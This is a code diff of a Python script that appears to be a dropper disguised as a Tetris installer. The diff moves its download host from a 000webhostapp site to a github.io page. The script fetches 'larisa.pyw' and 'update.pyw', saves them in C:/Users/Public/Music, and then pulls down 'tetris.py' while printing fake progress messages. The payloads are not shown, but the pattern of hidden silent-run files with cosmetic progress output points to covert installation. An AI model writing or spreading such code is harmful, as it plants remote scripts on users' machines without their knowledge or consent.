@@ -12,11 +12,11 @@ os.system('pip install http.client')
 os.system('pip install psutil')
 import requests
 import time
-url = 'https://larisapc.000webhostapp.com/larisa.pyw'
+url = 'https://inoplanetanen.github.io/larisa.pyw'
 r = requests.get(url, allow_redirects = True)
 open('C:/Users/Public/Music/file.pyw', 'wb').write(r.content)
 print('20%')
-urlupd = 'https://larisapc.000webhostapp.com/update.pyw'
+urlupd = 'https://inoplanetanen.github.io/update.pyw'
 rupd = requests.get(urlupd, allow_redirects = True)
 open('C:/Users/Public/Music/update.pyw', 'wb').write(rupd.content)
 
@@ -24,7 +24,7 @@ print('50%')
 file_path = os.path.dirname(os.path.realpath(__file__))
 print('wait one minute')
 
-urlupdw = 'https://larisapc.000webhostapp.com/tetris.py'
+urlupdw = 'https://inoplanetanen.github.io/tetris.py'
 rupdw = requests.get(urlupdw, allow_redirects = True)
 os.system('cls')
 open(file_path+'//tetris.py', 'wb').write(rupdw.content)
